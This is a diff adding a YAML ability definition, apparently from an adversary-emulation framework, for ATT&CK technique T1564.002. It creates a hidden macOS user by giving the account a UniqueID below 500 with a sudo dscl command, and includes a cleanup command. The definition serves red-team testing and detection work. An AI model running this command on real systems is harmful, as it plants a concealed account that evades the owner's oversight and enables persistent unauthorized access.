@@ -1,0 +1,16 @@
+- description: 'Add a hidden user on macOS using Unique ID < 500 (users with that
+    ID are hidden by default)
+
+    '
+  id: e7fed022-d1e3-befe-9ac5-dbb086f75363
+  name: Create Hidden User using UniqueID < 500
+  platforms:
+    darwin:
+      sh:
+        cleanup: sudo dscl . -delete /Users/APT
+        command: sudo dscl . -create /Users/APT UniqueID 333
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1564.002
+    name: 'Hide Artifacts: Hidden Users'
